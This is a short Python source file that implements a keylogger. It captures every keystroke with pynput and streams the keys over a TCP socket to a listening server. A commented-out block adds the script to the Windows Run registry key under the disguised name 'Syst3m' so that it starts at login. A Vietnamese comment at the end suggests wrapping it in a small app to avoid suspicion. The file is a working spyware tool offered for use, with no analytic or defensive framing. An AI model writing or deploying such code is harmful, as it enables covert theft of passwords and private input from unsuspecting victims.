import socket,time,os,sys,winreg, winreg as reg
from pynput.keyboard import Key, Listener
from threading import Thread

server_address =  ('127.0.0.1', 5001)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connected = False
while not connected:
    try:
        s.connect(server_address)
        connected = True
    except:
        time.sleep(1)

# Register to startup
'''def register_startup():
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
    address=sys.argv[0]
    address = os.path.abspath(address)
    try:
        opena = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
            
        reg.SetValueEx(opena,"Syst3m",0,reg.REG_SZ,address)
        reg.CloseKey(opena)
    except Exception:
        pass
register_startup()'''


inneed_key = [Key.backspace, Key.caps_lock, Key.ctrl_l, Key.ctrl_r, Key.ctrl, Key.enter, Key.space]
def on_press(key):
    str_key = ''
    try:
        str_key = str(key.char)
    except:
        str_key = str(key)
        if key not in inneed_key:
            return
    try:
        s.sendall(str_key.encode('utf-8'))
    except:
        pass
 
def inthread():
    with Listener(on_press=on_press) as listener:
        listener.join()
Thread(target=inthread).start()

# Bạn có thể tạo app nho nhỏ ở đây để tránh bị nghi ngờ :)
##########################################################
